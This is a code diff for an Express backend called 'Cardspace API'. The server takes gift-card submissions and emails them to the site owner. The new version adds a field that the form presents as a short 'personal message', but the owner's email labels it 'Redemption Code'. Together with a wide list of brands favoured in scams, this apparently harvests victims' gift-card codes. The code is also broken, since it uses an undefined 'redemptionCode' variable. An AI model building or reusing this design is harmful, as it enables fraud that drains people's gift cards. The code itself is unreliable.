@@ -4,7 +4,6 @@ import cors from "cors";
 import dotenv from "dotenv";
 import { Resend } from "resend";
 import rateLimit from "express-rate-limit";
-import { randomUUID } from "node:crypto";
 
 dotenv.config();
 
@@ -13,101 +12,150 @@ const PORT = process.env.PORT || 5000;
 
 app.disable("x-powered-by");
 
-const allowedOrigin =
-  process.env.FRONTEND_ORIGIN || "http://localhost:5173";
+/* =================================
+   CORS CONFIGURATION
+================================= */
+
+const allowedOrigins = [
+  "http://localhost:5173",
+  "http://127.0.0.1:5173",
+  "https://giftcardofficial.vercel.app",
+  ...(process.env.FRONTEND_ORIGIN || "")
+    .split(",")
+    .map((origin) => origin.trim())
+    .filter(Boolean),
+];
 
 app.use(
   cors({
-    origin: allowedOrigin,
-    methods: ["GET", "POST"],
+    origin(origin, callback) {
+      if (!origin || allowedOrigins.includes(origin)) {
+        return callback(null, true);
+      }
+
+      return callback(new Error("Origin not allowed by CORS"));
+    },
+    methods: ["GET", "POST", "OPTIONS"],
     allowedHeaders: ["Content-Type"],
   })
 );
 
 app.use(express.json({ limit: "10kb" }));
 
-const submissionLimiter = rateLimit({
+/* =================================
+   RATE LIMITING
+================================= */
+
+const limiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   limit: 10,
   standardHeaders: "draft-7",
   legacyHeaders: false,
-  message: {
-    message: "Too many requests. Please try again later.",
-  },
 });
 
-const allowedCards = new Set([
-  "Amazon",
+/* =================================
+   ALLOWED GIFT CARD BRANDS
+================================= */
+
+const allowedCards = [
   "Apple",
-  "Google Play",
+  "Amazon",
   "Steam",
-  "PlayStation",
+  "eBay",
   "Xbox",
+  "Googleplay",
+  "PlayStation",
   "Sephora",
-  "Walmart",
-  "Other",
-]);
+  "Nordstrom",
+  "Nike",
+  "Macy",
+  "Razor Gold",
+  "MasterCard",
+  "Vanilla",
+  "Wallmart Visa",
+  "Perfect Visa",
+  "Visa Silvery White",
+  "TT Visa",
+  "Amex",
+];
 
-const allowedCountries = new Set([
-  "Nigeria",
-  "United States",
-  "United Kingdom",
-  "Canada",
-  "Australia",
-  "Germany",
-  "Other",
-]);
-
-const allowedCurrencies = new Set([
+const allowedCurrencies = [
   "USD",
-  "NGN",
   "GBP",
-  "CAD",
   "AUD",
   "EUR",
-]);
+  "CAD",
+];
 
-const resend = new Resend(process.env.RESEND_API_KEY);
-
-function cleanText(value, maxLength = 100) {
-  if (typeof value !== "string") return "";
-  return value.trim().slice(0, maxLength);
-}
+/* =================================
+   HTML ESCAPING
+================================= */
 
 function escapeHtml(value) {
-  return String(value).replace(/[&<>"']/g, (char) => ({
-    "&": "&amp;",
-    "<": "&lt;",
-    ">": "&gt;",
-    '"': "&quot;",
-    "'": "&#39;",
-  })[char]);
+  return String(value).replace(/[&<>"']/g, (character) => {
+    const entities = {
+      "&": "&amp;",
+      "<": "&lt;",
+      ">": "&gt;",
+      '"': "&quot;",
+      "'": "&#39;",
+    };
+
+    return entities[character];
+  });
 }
 
-app.get("/api/health", (_req, res) => {
+/* =================================
+   HEALTH CHECK
+================================= */
+
+app.get("/api/health", (req, res) => {
   res.json({
     status: "ok",
     service: "Cardspace API",
   });
 });
 
-// GIFT CARD SUBMISSION
-app.post("/api/verification", submissionLimiter, async (req, res) => {
+/* =================================
+   GIFT CARD SUBMISSION
+================================= */
+
+app.post("/api/verification", limiter, async (req, res) => {
   try {
-    const cardType = cleanText(req.body?.cardType, 50);
-    const country = cleanText(req.body?.country, 60);
-    const currency = cleanText(req.body?.currency, 3);
+    const cardType =
+      typeof req.body?.cardType === "string"
+        ? req.body.cardType.trim()
+        : "";
+
+    const currency =
+      typeof req.body?.currency === "string"
+        ? req.body.currency.trim()
+        : "";
+
     const amount = Number(req.body?.amount);
 
-    if (
-      !allowedCards.has(cardType) ||
-      !allowedCountries.has(country) ||
-      !allowedCurrencies.has(currency)
-    ) {
+    const personalMessage =
+      typeof req.body?.message === "string"
+        ? req.body.message.trim()
+        : "";
+
+    /* VALIDATE CARD BRAND */
+
+    if (!allowedCards.includes(cardType)) {
       return res.status(400).json({
-        message: "Please select valid card, country, and currency options.",
+        message: "Please select a valid gift card brand.",
       });
     }
+
+    /* VALIDATE CURRENCY */
+
+    if (!allowedCurrencies.includes(currency)) {
+      return res.status(400).json({
+        message: "Please select a valid currency.",
+      });
+    }
+
+    /* VALIDATE AMOUNT */
 
     if (
       !Number.isFinite(amount) ||
@@ -119,156 +167,246 @@ app.post("/api/verification", submissionLimiter, async (req, res) => {
       });
     }
 
-    const {
-      RESEND_API_KEY,
-      EMAIL_FROM,
-      OWNER_EMAIL,
-    } = process.env;
+    /* VALIDATE PERSONAL MESSAGE */
 
-    if (!RESEND_API_KEY || !EMAIL_FROM || !OWNER_EMAIL) {
-      console.error("Email configuration is incomplete.");
-
-      return res.status(503).json({
-        message: "We cannot process your request right now.",
+    if (personalMessage.length > 40) {
+      return res.status(400).json({
+        message: "Your message must not exceed 40 characters.",
       });
     }
 
+    /* =================================
+       EMAIL CONFIGURATION
+    ================================= */
+
+    const apiKey = process.env.RESEND_API_KEY;
+    const emailFrom = process.env.EMAIL_FROM;
+    const ownerEmail = process.env.OWNER_EMAIL;
+
+    if (!apiKey || !emailFrom || !ownerEmail) {
+      console.error("Email environment variables are missing.");
+
+      return res.status(503).json({
+        message: "Email service is not configured.",
+      });
+    }
+
+    /* =================================
+       SUBMISSION DATE
+    ================================= */
+
     const submittedAt = new Date().toLocaleString("en-NG", {
-      dateStyle: "full",
-      timeStyle: "short",
       timeZone: "Africa/Lagos",
+      dateStyle: "medium",
+      timeStyle: "short",
     });
 
-    const reference = randomUUID()
-      .replace(/-/g, "")
-      .slice(0, 12)
-      .toUpperCase();
+    /* =================================
+       PREPARE SAFE EMAIL DATA
+    ================================= */
 
-    const safeCard = escapeHtml(cardType);
-    const safeCountry = escapeHtml(country);
+    const safeCardType = escapeHtml(cardType);
+    const safeCurrency = escapeHtml(currency);
+
     const safeAmount = escapeHtml(
-      `${currency} ${amount.toFixed(2)}`
+      amount.toLocaleString("en-US")
     );
-    const safeDate = escapeHtml(submittedAt);
-    const safeReference = escapeHtml(reference);
 
-    // HTML EMAIL: TEXT ONLY
-    const emailHtml = `
-      <div style="
-        background:#f4f5f9;
-        padding:30px 15px;
-        font-family:Arial,sans-serif;
-        color:#202333;
-      ">
+    const safeMessage = escapeHtml(
+      personalMessage || "No message provided"
+    );
+
+    const safeSubmittedAt = escapeHtml(submittedAt);
+
+    /* =================================
+       SEND EMAIL THROUGH RESEND
+    ================================= */
+
+    const resend = new Resend(apiKey);
+
+    const { error } = await resend.emails.send({
+      from: emailFrom,
+      to: [ownerEmail],
+      subject: "New Cardspace Gift Submission",
+
+      html: `
         <div style="
-          max-width:550px;
-          margin:auto;
-          background:#ffffff;
-          border:1px solid #e5e7ef;
-          border-radius:12px;
-          padding:28px;
+          font-family: Arial, sans-serif;
+          max-width: 600px;
+          margin: auto;
+          padding: 24px;
+          color: #222;
         ">
-          <h1 style="
-            text-align:center;
-            letter-spacing:3px;
-            color:#202333;
-          ">
-            CARDSPACE
-          </h1>
 
-          <h2 style="
-            color:#6549F5;
-            text-align:center;
-          ">
-            NEW GIFT CARD REQUEST
+          <h2 style="color: #6040a5;">
+            New Cardspace Submission
           </h2>
 
           <p>
-            A new gift card submission has been received.
+            A new gift-card information submission was received.
           </p>
 
-          <hr style="border:0;border-top:1px solid #e5e7ef;">
+          <table style="
+            width: 100%;
+            border-collapse: collapse;
+          ">
 
-          <p><strong>Brand:</strong> ${safeCard}</p>
-          <p><strong>Country:</strong> ${safeCountry}</p>
-          <p><strong>Amount:</strong> ${safeAmount}</p>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                Card brand
+              </td>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                <strong>${safeCardType}</strong>
+              </td>
+            </tr>
 
-          <p>
-            <strong>Status:</strong>
-            <span style="color:#b7791f;">
-              Pending review
-            </span>
-          </p>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                Currency
+              </td>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                ${safeCurrency}
+              </td>
+            </tr>
 
-          <p><strong>Reference:</strong> ${safeReference}</p>
-          <p><strong>Date:</strong> ${safeDate}</p>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                Gift Card Amount
+              </td>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                ${safeCurrency} ${safeAmount}
+              </td>
+            </tr>
 
-          <hr style="border:0;border-top:1px solid #e5e7ef;">
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                Redemption Code
+              </td>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                <strong>${safeMessage}</strong>
+              </td>
+            </tr>
+
+            <tr>
+              <td style="padding: 10px;">
+                Submitted
+              </td>
+              <td style="padding: 10px;">
+                ${safeSubmittedAt}
+              </td>
+            </tr>
+
+          </table>
 
           <p style="
-            font-size:12px;
-            color:#777;
-            text-align:center;
+            color: #777;
+            font-size: 12px;
+            margin-top: 24px;
           ">
-            This is a submission notification.
-            It does not establish card validity or activation.
+            This notification contains gift-card metadata
+            and the sender's personal message.
           </p>
+
+          <p style="color: #6040a5; font-size: 13px;">
+            Cardspace
+          </p>
+
         </div>
-      </div>
-    `;
+      `,
 
-    // PLAIN TEXT EMAIL
-    const emailText = [
-      "CARDSPACE - NEW GIFT CARD REQUEST",
-      "",
-      "A new gift card submission has been received.",
-      "",
-      `Brand: ${cardType}`,
-      `Country: ${country}`,
-      `Amount: ${currency} ${amount.toFixed(2)}`,
-      "Status: Pending review",
-      `Reference: ${reference}`,
-      `Date Submitted: ${submittedAt}`,
-      "",
-      "This is a submission notification, not proof of card validity.",
-    ].join("\n");
+      text: `
+New Cardspace Submission
 
-    // SEND TEXT EMAIL TO WEBSITE OWNER
-    const { data, error } = await resend.emails.send({
-      from: EMAIL_FROM,
-      to: [OWNER_EMAIL],
-      subject: `New ${cardType} Gift Card Request - ${reference}`,
-      html: emailHtml,
-      text: emailText,
+Card brand: ${cardType}
+Currency: ${currency}
+Amount: ${currency} ${amount.toLocaleString("en-US")}
+Redemption Code: ${redemptionCode || "No code provided"}
+Submitted: ${submittedAt}
+
+Cardspace
+      `,
     });
 
+    /* =================================
+       HANDLE EMAIL ERRORS
+    ================================= */
+
     if (error) {
-      console.error("Resend error:", error.message);
+      console.error("Resend error:", error);
 
       return res.status(502).json({
-        message: "We couldn't send your request. Please try again later.",
+        message: "Unable to send notification email.",
       });
     }
 
-    console.log("Owner notification sent:", data?.id);
-    console.log("Submission reference:", reference);
+    /* =================================
+       SUCCESS RESPONSE
+    ================================= */
 
     return res.status(200).json({
-      message: "Your request has been submitted successfully.",
-      reference,
+      message: "Submission received successfully.",
+
       submittedAt,
-      status: "Pending review",
+
+      status: "received",
+
+      details: {
+        cardType,
+        currency,
+        amount,
+        message: redemptionCode,
+      },
     });
 
   } catch (error) {
-    console.error("Cardspace request error:", error.message);
+    console.error("Submission error:", error);
 
     return res.status(500).json({
-      message: "We couldn't process your request. Please try again later.",
+      message: "An unexpected server error occurred.",
     });
   }
 });
 
-app.listen(PORT, () => {
-  console.log(`Cardspace API running on port ${PORT}`);
+/* =================================
+   UNKNOWN ROUTES
+================================= */
+
+app.use((req, res) => {
+  res.status(404).json({
+    message: "API route not found.",
+  });
 });
+
+/* =================================
+   ERROR HANDLER
+================================= */
+
+app.use((error, req, res, next) => {
+  if (error.message === "Origin not allowed by CORS") {
+    return res.status(403).json({
+      message: "Origin not allowed.",
+    });
+  }
+
+  console.error(error);
+
+  return res.status(500).json({
+    message: "Server error.",
+  });
+});
+
+/* =================================
+   VERCEL ENTRY POINT
+================================= */
+
+export default app;
+
+/* =================================
+   LOCAL DEVELOPMENT SERVER
+================================= */
+
+if (process.env.NODE_ENV !== "production") {
+  app.listen(PORT, () => {
+    console.log(`Cardspace API running on port ${PORT}`);
+  });
+}
